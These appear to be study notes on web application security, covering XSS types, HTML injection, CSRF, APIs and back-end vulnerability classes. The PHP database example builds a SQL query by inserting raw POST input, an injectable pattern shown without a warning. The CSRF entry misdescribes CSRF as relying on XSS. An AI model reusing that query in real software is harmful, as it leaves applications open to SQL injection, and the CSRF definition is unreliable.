- [Listing/Comparison of JS Frameworks](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks)

## Front End Vuls - Sensitive Data Exposure
Tags: #dataexposure #sensitivedataexposure #frontend
- **Sensitive Data Exposure** - Availability of sensitive data in clear-text to the end user - usually found in the source code of the web page, or page source.

## Front End Vuls - HTML Injection
Tags: #htmlinjection #webinjection
- **HTML Injection** - unfiltered user input is displayed on page
  - Retrieving previously submitted code (i.e. user comment from back end DB)
  - Directly displaying unfiltered user input through JS on front end
- Can include malicious HTML code (i.e. external login)

## Front End Vuls - XSS
- **Cross Site Scripting** - *injecting JS* to be executed on client-side.
  - **Reflected XSS** - user input is displayed on page after processing (i.e. search result or error message)
  - **Stored XSS** - Back End DB stores user input & displays upon retrieval (i.e. post, comment)
  - **DOM XSS** - User input directly shown in browser, and written to HTML DOM object (i.e. vulnerable username/page title)

## Front End Vuls - CSRF
- **XSRF** - utilize XSS Vulnerabilities to perform queries & API calls on web apps that user is authenticated. Attacker can perform actions as authenticated user
- Prevention
  - Measures on back end to detect and filter user input
  - Filter & sanitize user input on front end
  - **Sanitation** - removing special characters & non-standard characters from user input before displaying
  - **Validation** - ensure submitted user input matches the expected format
  - WAF

## Back End - Servers
- [Web Solution Stacks](https://en.wikipedia.org/wiki/Solution_stack)

## Back End - DBs
- Relationship between tables within a database is called a **schema**

Within PHP can connect to DB: `$conn = new mysqli("localhost", "user", 'pass')`
Can create new DB:
```
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```
Can use `mysqli` to connect to database, and run queries
```
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Using User Input:
```
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

## Back End - Developing Frameworks & APIs
Web Dev Frameworks
- Laravel (PHP) - startups/smaller companies & powerful yet easy to dev for
- Express (Node.JS)
- Django (Python)
- Rails (Ruby)
- APIs connect front end and back end to send data back and forth
- Front End uses APIs toask back end components for specific task with specific input
- Back end processes the request, performs the functions as necessary and returns response to front end

### Query Params
- Default method is `GET`/`POST` params
- Can specify values for certain parameters used within the page for back end components to process & respond
  - `search.php` would take `item` param, which is used to specify the search, and so passing it through a URL would look like `search.php?item=apples`
  - `POST` param would pass it as data at the bottom of a `POST HTTP` request

- API - specifies how app can interact with other applications
- Usually accessible over `HTTP` and handled and translated through web servers
- **SOAP (Simple Object Access)** - shares data through XML - request is made in XML via HTTP request, and response returned in XML
  - Front end parses XML output properly
  - Useful for structured & binary data
  - Often used with serialized objects
  - Useful for sharing *stateful* objects
- **REST (Representational State Transfer)** - shares data through URL path (`search/users/1`) and returns output in JSON (`userid 1`)
  - Focus on page w/ 1 type of input directly thourgh URL path
  - Useful to search, sort, filter
  - Usually breaks web app functionality into smaller APIs that use smaller requests to allow web app to perform more advanced actions
  - Requests in `JSON` - and response sin `JSON`, XML, or `x-www-form-urlencoded` or even raw data
  - Uses `GET` to retrieve data, `POST` to create, `PUT` to update existing, and `DELETE` to remove data

## Back End Vuls - Common
**Broken Authentication**- user can bypass authentication functions (i.e. regular user become admin without privs to do so)
**Broken Acess Control** - user can access pages & features they shouldn't have access to
**Malicious File Upload** - upload malicious script which can execute commands on remote server
**Command Injection** - insert commands as regularly intended content which can execute commands on back end server to gain control
**SQLi** - 


## Back End Vuls - Public
Tags: #publicvulns #publicvulnerabilities #vulnerabilities
https://www.vulnerability-lab.com/
https://www.rapid7.com/db/
https://www.exploit-db.com/